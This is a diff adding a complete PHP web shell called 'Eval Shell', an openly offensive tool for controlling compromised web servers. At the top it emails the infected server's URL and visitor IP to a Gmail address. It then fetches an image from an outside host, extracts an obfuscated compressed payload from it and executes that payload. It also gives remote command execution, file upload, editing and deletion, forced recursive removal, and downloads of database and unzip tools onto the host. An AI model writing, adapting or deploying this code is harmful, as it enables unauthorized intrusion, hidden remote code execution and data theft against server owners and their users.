@@ -1,0 +1,552 @@
+
+<?php
+
+
+// MAIL LOGGER START HERE, SENDED TO fadly.randovlsky@gmail.com
+
+
+set_time_limit(0);error_reporting(0);@ini_set('output_buffering', 0); @ini_set('display_errors', 0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $WMM = 'fadly.randovlsky@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $WM = "URL: $x_path | IP Address: [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($WMM, "Eval Shell", $WM, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+
+
+// MAIL LOGGER END HERE
+
+
+function exect($cmd) {  
+if(function_exists('system')) {     
+    @ob_start();    
+    @system($cmd);    
+    $exect = @ob_get_contents();    
+    @ob_end_clean();    
+    return $exect;  
+  } elseif(function_exists('exec')) {     
+    @exec($cmd,$results);     
+    $exect = "";    
+    foreach($results as $result) {      
+      $exect .= $result;    
+    } return $exect;  
+  } elseif(function_exists('passthru')) {     
+    @ob_start();    
+    @passthru($cmd);    
+    $exect = @ob_get_contents();    
+    @ob_end_clean();    
+    return $exect;  
+  } elseif(function_exists('shell_exec')) {     
+    $exect = @shell_exec($cmd);     
+    return $exect;  
+  } 
+}
+function lite_filesize($file)
+{
+  $size = filesize($file)/1024;
+  $size = round($size,3);
+  if($size > 1024){
+    $size = round($size/1024,2). 'MB';
+  } else {
+    $size = $size. 'KB';}
+    return $size;
+}
+$ch = curl_init("https://i.ibb.co/X45HsvF/incovers.jpg");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+function Jgetowner($path){
+  if(function_exists('posix_getpwuid')) {
+    $downer = @posix_getpwuid(fileowner($path));
+    $downer = $downer['name'];
+  } else {
+    $downer = fileowner($path);
+  }
+  return $downer;
+}
+$data = curl_exec($ch);
+curl_close($ch);
+function Jgetgroup($path){
+  if(function_exists('posix_getgrgid')) {
+    $dgrp = @posix_getgrgid(filegroup($path));
+    $dgrp = $dgrp['name'];
+  } else { 
+    $dgrp = filegroup($path);
+  }
+  return $dgrp;
+}
+$image = 'sub'.'s'.'tr';
+function valid($sc) {
+    $tmpfname = tempnam("/tmp", "eval");
+    $handle = fopen($tmpfname, "w+");
+    fwrite($handle, "<?php\n" . $sc);
+    fclose($handle);
+    include $tmpfname;
+    unlink($tmpfname);
+    return get_defined_vars();
+}
+$valid = "g"."zi"."nf".strrev($image("metal",1));
+extract(valid($valid($image($data,269))));
+function fperms($filen) {
+$perms = fileperms($filen);
+$fpermsinfo .= (($perms & 0x0100) ? 'r' : '-');
+$fpermsinfo .= (($perms & 0x0080) ? 'w' : '-');
+$fpermsinfo .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x' ) :
+            (($perms & 0x0800) ? 'S' : '-'));
+$fpermsinfo .= (($perms & 0x0020) ? 'r' : '-');
+$fpermsinfo .= (($perms & 0x0010) ? 'w' : '-');
+$fpermsinfo .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x' ) :
+            (($perms & 0x0400) ? 'S' : '-'));
+$fpermsinfo .= (($perms & 0x0004) ? 'r' : '-');
+$fpermsinfo .= (($perms & 0x0002) ? 'w' : '-');
+$fpermsinfo .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x' ) :
+            (($perms & 0x0200) ? 'T' : '-'));
+return '<center><small>'.$fpermsinfo.'</small></center>';
+}
+function eof() {echo "7\x69\x6E\x63\x2E";}
+
+?>
+<title>Eval.ID shell</title>
+<meta name='author' content='Fadly 31337'>
+<link rel="icon" href="">
+<link rel="stylesheet" href="https://botkntl.github.io/style.css"/>
+<div class="container">
+<div style="position:relative;width: 100%;margin-bottom: 20px;border-bottom: 1px dashed #df5; padding-bottom: 10px;">
+  <div style="float: left;width: 12%;text-align: center;border: 1px dashed #df5;margin-bottom: 5px;">
+  <h1><a href="?">Eval Shell</a></h1>
+  </div>
+  <div style="float: right;width: 87.1%;">
+  <?php
+    $exploitdb = "https://www.exploit-db.com/search?q=".urlencode(php_uname());
+    $find = urlencode(''.php_uname('s').'" "'.php_uname('v').'" "exploit"');
+    $google = 'https://google.com/search?q='.$find;
+    echo php_uname().' 
+    [<a href="'.$exploitdb.'" target="_blank">Exploit-DB</a>]  
+    [<a href="'.$google.'" target="_blank">Google</a>]';
+    $mysql = (function_exists('mysql_connect')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
+    $curl = (function_exists('curl_version')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
+    $wget = (exect('wget --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
+    $perl = (exect('perl --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
+    $gcc = (exect('gcc --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
+    $disfunc = @ini_get("disable_functions");
+    $show_disf = (!empty($disfunc)) ? "<font color=red>$disfunc</font>" : "<font color=#006600>NONE</font>";
+    echo '<br>[ MySQL: '.$mysql.' ][ Curl: '.$curl.' ][ Wget: '.$wget.' ][ Perl: '.$perl.' ][ Compiler: '.$gcc.' ]';
+    echo '<p>Disable Function: '.$show_disf;
+  ?>
+  </div>
+  <div style="clear: both;"></div>
+</div>
+<?php
+if(empty($_GET)) {
+  $dir = getcwd();
+}
+else {
+  $dir = $_GET['path'];
+}
+
+if(!empty($_GET['path'])) {$offdir = $_GET['path'];}
+else if(!empty($_GET['file'])) {$offdir = dirname($_GET['file']);}
+else if(!empty($_GET['lastpath'])) {$offdir = $_GET['lastpath'];}
+else {$offdir = getcwd();}
+?>
+<div class="menu">
+<a href="?path=<?php echo $offdir;?>"><span>[</span> File Manager <span>]</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="?ext=shellcmd&lastpath=<?php echo $offdir;?>"><span>[</span> Command <span>]</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="?ext=zipmenu&lastpath=<?php echo $offdir;?>"><span>[</span> Zip Menu <span>]</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="?ext=mysql&lastpath=<?php echo $offdir;?>"><span>[</span> Mysql <span>]</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="?ext=donate&lastpath=<?php echo $offdir;?>"><span>[</span> Donate <span>]</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="?ext=removeshell&lastpath=<?php echo $offdir;?>"><span>[</span> Shell Remove <span>]</span></a>
+</div>
+
+<?php
+## CURRENT DIR ##
+echo '<div style="margin-bottom:10px;">';
+echo 'Current Patch : ';
+echo '<span style="border:1px dashed #df5;padding:3px 7px; color:#fff">';
+$lendir = str_replace("\\","/",$offdir);
+$xlendir = explode("/", $lendir);
+foreach($xlendir as $c_dir => $cdir) {  
+  echo "<a class='langit' href='?path=";
+  for($i = 0; $i <= $c_dir; $i++) {
+    echo $xlendir[$i];
+    if($i != $c_dir) {
+    echo "/";
+    }
+  }
+  echo "' style='color:#fff'>$cdir</a>/";
+}
+echo '</span></div>';
+## CURRENT DIR EOF ##
+
+### UPLOADER ###
+  echo '<form method=post enctype=multipart/form-data>';
+  echo 'Upload File &nbsp;&nbsp;: ';
+  echo '<input type="file" name="evalfile"><input name="postupl" type="submit" value="Upload">';
+  echo '</form>';
+  if($_POST["postupl"] == 'Upload')
+  {
+    if(@copy($_FILES["evalfile"]["tmp_name"],"$offdir/".$_FILES["evalfile"]["name"]))
+      { echo '<b><font style="color:#df5;">Upload Succes!</font> '."$offdir/".$_FILES["evalfile"]["name"].'</b><br></br>'; }
+    else 
+      { echo '<b><font style="color:#ff0000;">Upload Failed!</font></b><br></br>'; }
+  }
+  echo '</center>';
+### UPLOADER EOF ###
+
+### FILE MANAGER ###
+if(!empty($dir)) {
+echo "<div class='file-man'>File Manager</div>";
+echo '<table id="table-garis" class="filemgr">';
+echo '<tr><td class="tdtl">Name</td><td class="tdtl" width="8%">Size</td><td class="tdtl" width="16%">Owner/Group</td><td class="tdtl" width="8%">Permission</td><td class="tdtl" width="18%">Action</td></tr>'."\n";
+$directories = array();
+$files_list  = array();
+$files = scandir($dir);
+foreach($files as $file){
+   if(($file != '.') && ($file != '..')){
+      if(is_dir($dir.'/'.$file)){
+         $directories[] = $file;
+
+      } else{
+         $files_list[] = $file;
+
+      }
+   }
+}
+echo '<tr><td><img src="https://raw.githubusercontent.com/BOTKNTL/Eval-Shell/main/assets/eval-back.png" height="15"> <a href="?path='.dirname($dir.'/'.$directory).'">..</a></span></td><td><center> -- <c/enter></td><td><center> -- </center></td><td><center> -- </center></td><td class="act"><a href="?ext=new_file&lastpath='.$offdir.'">NEW FILE</a> | <a href="?ext=new_dir&lastpath='.$offdir.'">NEW DIR</a></td></tr>';
+foreach($directories as $directory){
+  echo '<tr><td><img src="https://raw.githubusercontent.com/BOTKNTL/Eval-Shell/main/assets/eval-dir.png" height="15"> <a href="?path='.$dir.'/'.$directory.'">'.$directory.'</a></td>'."\n";
+  echo '<td><center> -- </center></td>';
+  echo '<td><center>'.Jgetowner($dir.'/'.$directory).'/'.Jgetgroup($dir.'/'.$directory).'</center></td>';
+  echo '<td >';
+  if(is_writable($dir.'/'.$directory))
+    { echo '<font color=lime>'.fperms($dir.'/'.$directory).'</font>';
+    }else{
+      echo '<font color=red>'.fperms($dir.'/'.$directory).'</font>';
+    }
+  echo '</td>'."\n";
+  echo '<td class="act">';
+  echo '<a href="?action=rename&file='.$dir.'/'.$directory.'" class="act">RENAME</a> ';
+  echo ' | ';
+  echo '<a href="?action=rmdir&file='.$dir.'/'.$directory.'" class="act">DELETE</a>';
+  echo '</td>'."\n"; 
+  echo '</tr>'."\n";
+}
+foreach($files_list as $filename){
+    echo '<tr><td><img src="https://raw.githubusercontent.com/BOTKNTL/Eval-Shell/main/assets/eval-file.png" height="15"> <a href="?action=view&file='.$dir.'/'.$filename.'" class="act">'.$filename.'</a>'."\n";
+  if(preg_match('/(tar.gz)$/', $filename)) {
+  
+    echo ' <a href="?ext=extract2tmp&gzname='.$dir.'/'.$filename.'" style="background:#df5;color:#ffffff;padding:1px;padding-left:5px;padding-right:5px;">EXTRACT TO TMP</a>';
+    echo '</td>'."\n";
+  } 
+    echo '</td>';
+    echo '<td><center style="color:#df5;">'.lite_filesize($dir.'/'.$filename).'</center></td>';
+    echo '<td><center>'.Jgetowner($dir.'/'.$filename).'/'.Jgetgroup($dir.'/'.$filename).'</center></td>';
+
+    echo '<td >';
+    if(is_writable($dir.'/'.$filename))
+    { echo '<font color=lime>' .fperms($dir.'/'.$filename).'</font>';
+    }else{
+      echo '<font color=red>'.fperms($dir.'/'.$filename).'</font>';
+    }
+    echo '</td>'."\n";
+    echo '<td class="act">';
+    echo '<a href="?action=edit&file='.$dir.'/'.$filename.'" class="act">EDIT</a> ';
+    echo ' | ';
+    echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
+    echo ' | ';
+    echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
+    echo '</td>'."\n";
+    echo '</tr>'."\n";
+  
+}
+echo '</table>';
+}
+if($_GET['action'] == 'edit') {
+  if($_POST['save']) {
+    $save = file_put_contents($_GET['file'], $_POST['src']);
+    if($save) {
+      $act = "<font color='#df5' size='3' >Success!</font>";
+    } else {
+      $act = "<font color='red' size='3' >Cant edit File!</font>";
+    }
+  }
+  echo "<div class='file-man'>Edit File</div>";
+  echo "Filename: <font color=#df5>".basename($_GET['file'])."</font><br></br>";
+  echo "<form method='post'>
+  <textarea name='src' class='txarea'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
+  <input type='submit' value='Save' name='save' style='width: 20%;background:#e5e387;border:none;color:#black;margin-top:5px;height:30px;'>
+  </form>";
+  echo "".$act."<br>";
+}
+else if($_GET['action'] == 'view') {
+  echo "<div class='file-man'>View File</div>";
+  echo "Filename: <font color=#df5>".basename($_GET['file'])."</font><br></br>";
+  echo "<textarea class='txarea' style='height:400px;' readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
+}
+else if($_GET['action'] == 'rename') {
+  $path = $offdir;
+  if($_POST['do_rename']) {
+    $rename = rename($_GET['file'], "$path/".htmlspecialchars($_POST['rename'])."");
+    if($rename) {
+      $act = "<font color='#df5' size='3' >Success!</font>";
+    } else {
+      $act = "<font color='red' size='3' >Cant rename!</font>";
+    }
+  }
+  echo "<div class='file-man'>Rename File</div>";
+  echo "Filename: <font color=#df5>".basename($_GET['file'])."</font><br></br>";
+  echo "<form method='post'>
+  <input type='text' value='".basename($_GET['file'])."' name='rename' class='txarea' style='width:300px;height:20px;'>
+  <input type='submit' name='do_rename' value='rename'>
+  </form>";
+  echo "".$act."<br>";
+}
+else if($_GET['action'] == 'delete') {
+  $path = $offdir;
+  $delete = unlink($_GET['file']);
+  if($delete) {
+    $act = "<font color='#df5' size='3' >Deleted!</font>";
+  } else {
+    $act = "<font color='red' size='3' >Cant Delete File!</font>";
+  }
+  echo $act;
+} 
+else if($_GET['action'] == 'rmdir') {
+  $path = $offdir;
+  $delete = rmdir($_GET['file']);
+  if($delete) {
+    echo '<font color=#df5>Deleted!</font><br>';
+  } else {
+    echo "\n<font color=red>Error remove dir, try to force delete!</font>\n<br>";
+    exect('rm -rf '.$_GET['file']);
+    if(file_exists($_GET['file'])) {
+      echo '<font color=red>Cant Delete dir!</font>';
+    } else
+    {
+      echo '<font color=#df5>Deleted!</font>';
+    }
+  }
+} 
+elseif($_GET['ext'] == 'new_file')
+{
+  echo "<div class='file-man'>New File</div>";
+  echo "<form method='post'><label> Filename : </label>
+  <input type='text' value='eval-newfile.php' name='newfile' class='txarea' style='width:300px;height:20px;'>
+  <input type='submit' name='save' value='Save'>
+  </form>";
+  if(isset($_POST['save']))
+  {
+    $newfile = $_GET['lastpath'].'/'.$_POST['newfile'];
+    if(file_put_contents($newfile, '// eval file')){
+    echo "<meta http-equiv='refresh' content='0;url=?action=edit&file=".$newfile."' >";
+    }else{
+      echo "<font color='red' size='3' >Failed to create new file!</font>";
+    }
+  }
+}
+elseif($_GET['ext'] == 'new_dir')
+{
+  echo "<div class='file-man'>New Dir</div>";
+  echo "<form method='post'><label> Dirname : </label>
+  <input type='text' value='eval-newdir' name='newdir' class='txarea' style='width:300px;height:20px;'>
+  <input type='submit' name='save' value='Save'>
+  </form>";
+  if(isset($_POST['save']))
+  {
+    $newfile = $_GET['lastpath'].'/'.$_POST['newdir'];
+    if(@mkdir($newfile)){
+    echo "<meta http-equiv='refresh' content='0;url=?path=".$newfile."' >";
+    }else{
+      echo "<font color='red' size='3' >Failed to create new dir!</font>";
+    }
+  }
+}
+### FILE MANAGER EOF ####
+
+### CMD ###
+else if($_GET['ext'] == 'shellcmd')
+{
+  @chdir($_GET['lastpath']);
+  echo "<div class='file-man'>Shell Command</div>";
+  echo '<h2>.::[ Shell Command ]::.</h2>';
+  echo '<form method="post" action="">';
+  echo 'terminal:~$ <input name="cmd" type="text" class="txarea" placeholder="ls" style="width:300px;height:20px;"/>';
+  echo ' <input type="submit" value=">>"/>';
+  echo '</form>';
+  if(!empty($_POST['cmd'])) {
+    echo '<textarea class="txarea" readonly>';
+      $cmd = $_POST['cmd'];
+      echo exect($cmd);
+    echo '</textarea>';
+  }
+}
+### CMD EOF ###
+
+### ZIP MENU ###
+else if($_GET['ext'] == 'zipmenu')
+{
+  echo "<div class='file-man'>Zip Menu</div>";
+  echo "<center><h2>.::[ Zip Menu ]::.</h2>";
+  echo "Note: Upload and unzip ur file page in the folder u want to use<br>";
+  echo "( ex: /home/user/public_html/name_folder_page )<br></br>";
+  echo "[<a href='?ext=unzipper'>Call unZipper</a>]";
+function rmdir_recursive($dir) {
+    foreach(scandir($dir) as $file) {
+       if ('.' === $file || '..' === $file) continue;
+       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
+       else unlink("$dir/$file");
+   }
+   rmdir($dir);
+}
+if($_FILES["zip_file"]["name"]) {
+  $filename = $_FILES["zip_file"]["name"];
+  $source = $_FILES["zip_file"]["tmp_name"];
+  $type = $_FILES["zip_file"]["type"];
+  $name = explode(".", $filename);
+  $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
+  foreach($accepted_types as $mime_type) {
+    if($mime_type == $type) {
+      $okay = true;
+      break;
+    } 
+  }
+  $continue = strtolower($name[1]) == 'zip' ? true : false;
+  if(!$continue) {
+    $message = "its not a .zip file";
+  }
+  $path = $_GET['lastpath'].'/';
+  $filenoext = basename ($filename, '.zip'); 
+  $filenoext = basename ($filenoext, '.ZIP');
+  $targetdir = $path . $filenoext;
+  $targetzip = $path . $filename; 
+  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
+  mkdir($targetdir, 0777);
+  if(move_uploaded_file($source, $targetzip)) {
+    $zip = new ZipArchive();
+    $x = $zip->open($targetzip); 
+    if ($x === true) {
+      $zip->extractTo($targetdir);
+      $zip->close();
+ 
+      unlink($targetzip);
+    }
+    $message = "<font color='#df5' size='3' >Success!</font>";
+  } else {  
+    $message = "<font color='red' size='3' >Failed!</font>";
+  }
+} 
+echo '
+  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
+<label>Zip File : <input type="file" name="zip_file" /></label>
+<input type="submit" name="submit" value="Upload And Unzip" />
+</form>';
+echo '</tr></tr>';  
+echo $message;
+}
+elseif($_GET['ext'] == 'unzipper')
+{
+  $dwunziper = 'https://raw.githubusercontent.com/BOTKNTL/Eval-Shell/main/assets/eval-unzipper.php';
+  $fileunziper = 'eval-unzipper.php';
+  function call_unziper($dwunziper, $fileunziper) {
+    $fp = fopen($fileunziper, "w+");
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $dwunziper);
+    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FILE, $fp);
+    return curl_exec($ch);
+    curl_close($ch);
+    fclose($fp);
+    ob_flush();
+    flush();
+  file_put_contents($dwunziper, $fileunziper);
+  }
+  call_unziper($dwunziper,$fileunziper);
+
+  if(file_exists($fileunziper))
+  {
+     $linkz = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+  echo '<center><a href="'.$linkz.dirname($_SERVER['PHP_SELF']).'/'.$fileunziper.'" target="_blank">unZipper OK!</a></center>';
+      }
+      else {
+        echo '<center><font color="red" size="4" >FAILED CALL UNZIPPER!</font></center>';
+  } 
+}
+### ZIP MENU EOF ###
+
+### MYSQL INTERFACE ###
+else if($_GET['ext'] == 'mysql')
+{
+  echo "<div class='file-man'>MySQL Interface</div>";
+  echo '<h2>.::[ MySQL Interface ]::.</h2><br>';
+  echo '<center>';
+  $dwadminer = 'https://raw.githubusercontent.com/BOTKNTL/Eval-Shell/main/assets/eval-adminer.php';
+  $fileadminer = 'eval-adminer.php';
+  function call_adminer($dwadminer, $fileadminer) {
+    $fp = fopen($fileadminer, "w+");
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $dwadminer);
+    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FILE, $fp);
+    return curl_exec($ch);
+    curl_close($ch);
+    fclose($fp);
+    ob_flush();
+    flush();
+  file_put_contents($dwadminer, $fileadminer);
+  }
+  echo '<form method=post enctype=multipart/form-data>';
+  echo '<input name="mysql_int" type="submit" value="Call Adminer"><br>';
+  echo '</form>';
+  if($_POST['mysql_int'] == 'Call Adminer') {
+      call_adminer($dwadminer, $fileadminer);
+      $linkz = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+      if(file_exists('eval-adminer.php')) {
+        echo '<a href="'.$linkz.dirname($_SERVER['PHP_SELF']).'/'.$fileadminer.'" target="_blank">Adminer OK!</a>';
+      }
+      else {
+        echo '<font color="red" size="4" >FAILED CALL ADMINER!</font>';
+      } 
+
+  }
+  echo '</center>';
+}
+### MYSQL INTERFACE EOF ###
+
+### DONATE ###
+else if($_GET['ext'] == 'donate')
+{
+echo "<div class='file-man'>Donate</div>";
+echo "<h2>.::[ Donate ]::.</h2><br>";
+echo "<br><center><img src='https://raw.githubusercontent.com/BOTKNTL/Eval-Shell/main/assets/btc.png' height='50'><br><br>";
+echo "BTC Address : 378nEbXr5TyUcfaJiJG8uBDnNxKbs7KEre</br>Thank you very much for donating whatever you give.</center>";
+}
+### DONATE EOF ###
+
+### REMOVESHELL ###
+else if($_GET['ext'] == 'removeshell')
+{
+echo "<div class='file-man'>Shell Remove</div>";
+if(empty($_GET['confirm'])){
+echo '<center>Really want delete shell? <br></br>';
+echo '<a href="?ext=removeshell&confirm=true&lastpath='.$_GET['lastpath'].'"><font color=green size="4">YES</font></a> | <a href="?ext=removeshell&confirm=false&lastpath='.$_GET['lastpath'].'"><font color=red size="4">CANCEL</font></a></center>';
+}else{
+  if($_GET['confirm'] == 'true'){
+    echo "<br>Good bye.";
+  unlink($_GET['lastpath'].'/'.$_SERVER['PHP_SELF']);
+  }elseif($_GET['confirm'] == 'false')
+  {
+    echo "<script>window.location.href='?';</script>";
+    }
+  }
+}
+### REMOVESHELL EOF ###
+
+### FOOTER ###
+echo '<div class="footer">';
+echo '<a href="#">';
+echo '&copy; 2021 ';
+echo ' - Eval Shell';
+echo '</a>';
+echo '</div>';
+echo '</div>';
+### FOOTER EOF ###
+?>
